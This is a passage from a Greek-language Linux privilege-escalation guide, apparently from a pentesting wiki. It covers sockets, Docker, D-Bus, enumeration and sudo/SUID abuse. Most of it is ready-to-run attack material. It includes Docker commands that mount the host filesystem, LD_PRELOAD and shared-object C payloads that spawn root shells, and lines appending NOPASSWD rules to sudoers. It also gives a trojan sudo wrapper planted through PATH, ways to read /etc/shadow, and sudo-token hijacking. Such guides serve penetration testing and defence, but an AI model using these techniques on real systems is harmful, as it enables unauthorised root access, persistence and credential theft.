- `Accept`: Δέχεται boolean όρισμα. Αν είναι **true**, δημιουργείται μια **instance service** για κάθε εισερχόμενη σύνδεση και μόνο το connection socket προωθείται σε αυτή. Αν είναι **false**, όλα τα listening sockets οι ίδιοι **προωθούνται στη ξεκινούμενη service unit**, και δημιουργείται μόνο μία service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου μια μοναδική service unit χειρίζεται αναγκαστικά όλη την εισερχόμενη κίνηση. **Προεπιλογή: false**. Για λόγους απόδοσης, συνίσταται οι νέοι daemons να γράφονται με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** αντίστοιχα που τα listening **sockets**/FIFOs **δημιουργηθούν** και συνδεθούν (bound). Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από ορίσματα για τη διεργασία.
- `ExecStopPre`, `ExecStopPost`: Επιπλέον **εντολές** που **εκτελούνται πριν** ή **μετά** αντίστοιχα που τα listening **sockets**/FIFOs **κλείσουν** και αφαιρεθούν.
- `Service`: Καθορίζει το όνομα της **service** unit που **θα ενεργοποιηθεί** σε **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Από προεπιλογή δείχνει στην service που έχει το ίδιο όνομα με το socket (με την κατάληξη αντικατεστημένη). Στις περισσότερες περιπτώσεις δεν θα είναι απαραίτητο να χρησιμοποιήσετε αυτή την επιλογή.

### Writable .socket files

Αν βρείτε ένα **εγγράψιμο** `.socket` αρχείο μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει reboot του μηχανήματος.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη διαμόρφωση του socket αρχείου αλλιώς το backdoor δεν θα εκτελεστεί_

### Writable sockets

Αν **εντοπίσετε κάποιο εγγράψιμο socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα config `.socket` αρχεία_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε κάποια ευπάθεια.

### Καταγραφή Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation παράδειγμα:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν μερικά **sockets listening for HTTP** requests (_Δεν αναφέρομαι στα .socket αρχεία αλλά σε αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **απαντά σε ένα HTTP** αίτημα, τότε μπορείτε να **επικοινωνήσετε** με αυτό και ίσως να **exploit κάποια ευπάθεια**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να ασφαλιστεί. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή δικαιώματος εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί μια ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

Αν έχετε δικαίωμα εγγραφής στο Docker socket, μπορείτε να escalate privileges χρησιμοποιώντας τις ακόλουθες εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές επιτρέπουν να τρέξετε ένα container με πρόσβαση επιπέδου root στο file system του host.

#### **Χρήση του Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί ακόμα να χειριστεί μέσω του Docker API και εντολών `curl`.

1.  **List Docker Images:** Ανάκτηση της λίστας με τα διαθέσιμα images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλτε ένα αίτημα για να δημιουργήσετε ένα container που προσαρτά το root directory του host συστήματος.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε το `socat` για να δημιουργήσετε σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού ρυθμίσετε τη σύνδεση `socat`, μπορείτε να εκτελείτε εντολές απευθείας μέσα στο container με πρόσβαση root στο filesystem του host.

### Others

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **inside the group `docker`** έχετε [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus είναι ένα προηγμένο σύστημα inter-Process Communication (IPC) που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποτελεσματικά. Σχεδιασμένο για το σύγχρονο Linux σύστημα, προσφέρει ένα ανθεκτικό πλαίσιο για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, παρόμοιο με βελτιωμένα UNIX domain sockets. Επιπλέον, βοηθά στη μετάδοση γεγονότων ή σημάτων, προάγοντας την ομαλή ενσωμάτωση μεταξύ συστατικών του συστήματος. Για παράδειγμα, ένα σήμα από έναν Bluetooth daemon για εισερχόμενη κλήση μπορεί να οδηγήσει έναν music player να κάνει mute, βελτιώνοντας την εμπειρία χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα remote object system, απλοποιώντας τα αιτήματα υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών, διευκολύνοντας διαδικασίες που παραδοσιακά ήταν πολύπλοκες.

Το D-Bus λειτουργεί με μοντέλο **allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων, κ.λπ.) βάσει του σωρευτικού αποτελέσματος κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν escalation privileges μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει τα δικαιώματα για τον χρήστη root να κατέχει, να στέλνει και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα εφαρμόζονται καθολικά, ενώ οι πολιτικές με context "default" εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να enumerate και exploit μια D-Bus επικοινωνία εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να enumerate το δίκτυο και να εντοπίσεις τη θέση της μηχανής.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτές θύρες

Πάντα ελέγχετε τις υπηρεσίες δικτύου που εκτελούνται στη μηχανή με την οποία δεν καταφέρατε να αλληλεπιδράσετε πριν την πρόσβαση σε αυτήν:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, μπορεί να καταφέρετε να αποκτήσετε κάποια credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Ελέγξτε **who** είστε, ποιες **privileges** έχετε, ποιοι **users** υπάρχουν στα συστήματα, ποιοι μπορούν να **login** και ποιοι έχουν **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Μεγάλο UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να escalate privileges. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί

If you **know any password** of the environment **try to login as each user** using the password.

### Su Brute

Αν δεν σε πειράζει να δημιουργήσεις πολύ θόρυβο και τα δυαδικά `su` και `timeout` υπάρχουν στον υπολογιστή, μπορείς να προσπαθήσεις να κάνεις brute-force έναν χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Writable PATH abuses

### $PATH

Αν διαπιστώσεις ότι μπορείς να **γράψεις μέσα σε κάποιον φάκελο του $PATH** μπορεί να είσαι σε θέση να escalate privileges με το **δημιουργήσεις ένα backdoor μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελό σου στο $PATH.

### SUDO and SUID

Μπορεί να σου επιτρέπεται να εκτελέσεις κάποια εντολή χρησιμοποιώντας sudo ή κάποια εντολή μπορεί να έχει το suid bit. Έλεγξέ το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Ορισμένες **μη αναμενόμενες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμη και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να τρέξει το `vim` ως `root`. Τώρα είναι απλό να αποκτήσετε ένα shell προσθέτοντας ένα ssh key στον root directory ή καλώντας το `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** ενώ εκτελεί κάτι:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **based on HTB machine Admirer**, ήταν **vulnerable** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη python βιβλιοθήκη κατά την εκτέλεση του script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV διατηρείται μέσω sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Γιατί λειτουργεί: Για μη-διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source εκείνο το αρχείο πριν τρέξει το target script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Εάν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνει source με δικαιώματα root.

- Απαιτήσεις:
- Ένας κανόνας sudo που μπορείτε να τρέξετε (οποιοσδήποτε στόχος που καλεί το `/bin/bash` μη διαδραστικά, ή οποιοδήποτε bash script).
- `BASH_ENV` παρόν στο `env_keep` (ελέγξτε με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληροποίηση:
- Αφαίρεσε `BASH_ENV` (και `ENV`) από `env_keep`, προτίμησε `env_reset`.
- Απόφυγε shell wrappers για sudo-allowed commands· χρησιμοποίησε minimal binaries.
- Εξέτασε sudo I/O logging και alerting όταν χρησιμοποιούνται preserved env vars.

### Διαδρομές παράκαμψης εκτέλεσης sudo

**Jump** για να διαβάσεις άλλα αρχεία ή χρησιμοποίησε **symlinks**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί **wildcard** (\*), είναι ακόμη πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντιμετρήσεις**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς καθορισμένη διαδρομή εντολής

Εάν η **sudo άδεια** έχει δοθεί για μια μόνο εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_ μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί εάν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει το μονοπάτι προς αυτή (πάντα ελέγξτε με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με μονοπάτι εντολής

Εάν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας το μονοπάτι**, τότε μπορείτε να προσπαθήσετε να **export a function** με όνομα την εντολή που καλεί το suid αρχείο.

Για παράδειγμα, εάν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_ πρέπει να προσπαθήσετε να δημιουργήσετε τη συνάρτηση και να την export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Στη συνέχεια, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να ορίσει μία ή περισσότερες shared libraries (.so αρχεία) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως προφόρτωση (preloading) βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η κατάχρηση αυτής της δυνατότητας, ιδιαίτερα με εκτελέσιμα **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί **LD_PRELOAD** για εκτελέσιμα όπου το πραγματικό user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για εκτελέσιμα με suid/sgid, προφορτώνονται μόνο βιβλιοθήκες σε standard paths που είναι επίσης suid/sgid.

Μπορεί να προκύψει ανύψωση προνομίων (Privilege escalation) εάν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμα και όταν οι εντολές τρέχουν με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με υψηλότερα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Έπειτα **compile it** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** τρέχοντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Μια παρόμοια privesc μπορεί να εκμεταλλευτεί αν ο επιτιθέμενος ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή όπου θα αναζητούνται οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν εντοπίζετε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγξετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα exploitation.

Για να το exploit, θα προχωρούσατε δημιουργώντας ένα C αρχείο, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην ανύψωση προνομίων χειριζόμενος τα δικαιώματα αρχείων και εκτελώντας ένα shell με αυξημένα προνόμια.

Μεταγλωττίστε το παραπάνω C file σε shared object (.so) αρχείο με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεαζόμενου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας ενδεχόμενη παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που βρήκαμε ένα SUID binary που φορτώνει μια library από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε την library σε εκείνο τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Αν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να έχει μια συνάρτηση που ονομάζεται `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα από Unix binaries που μπορούν να αξιοποιηθούν από έναν attacker για να παρακάμψουν τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **only inject arguments** in a command.

Το project συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να διαφύγουν από restricted shells, να escalate ή να διατηρήσουν elevated privileges, να μεταφέρουν αρχεία, να spawn bind και reverse shells, και να διευκολύνουν άλλες post-exploitation εργασίες.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό, μπορείτε να escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στο root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **third exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που καθιστά τους **sudo tokens** μόνιμους και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν **sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχετε **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που δημιουργούνται μέσα στον φάκελο, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για χρήστη και PID**.\\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε shell ως ο χρήστης με PID 1234, μπορείτε να **αποκτήσετε sudo δικαιώματα** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιήσει το `sudo` και πώς. Αυτά τα αρχεία **εκ προεπιλογής μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Εάν** μπορείτε να **διαβάσετε** αυτό το αρχείο μπορεί να καταφέρετε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και εάν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα είστε σε θέση να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν έχεις δικαίωμα εγγραφής, μπορείς να το καταχραστείς.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος για να καταχραστείτε αυτά τα δικαιώματα:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν ορισμένες εναλλακτικές για το `sudo`, όπως το `doas` για OpenBSD — ελέγξτε τη διαμόρφωσή του στο `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Αν γνωρίζεις ότι ένας **user συνήθως συνδέεται σε μια machine και χρησιμοποιεί `sudo`** για να αυξήσει τα privileges και έχεις ένα shell μέσα στο context αυτού του user, μπορείς να **δημιουργήσεις ένα νέο sudo executable** που θα εκτελεί τον κώδικά σου ως root και μετά την εντολή του χρήστη. Έπειτα, **τροποποίησε το $PATH** του user context (για παράδειγμα προσθέτοντας το νέο path στο .bash_profile) έτσι ώστε όταν ο user εκτελεί sudo, το sudo executable σου να εκτελείται.

Σημείωση ότι αν ο user χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσεις άλλα αρχεία για να προσθέσεις το νέο path. Για παράδειγμα[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείς να βρεις άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή τρέχοντας κάτι όπως:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` δείχνει **από πού προέρχονται τα φορτωμένα αρχεία ρυθμίσεων**. Τυπικά, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

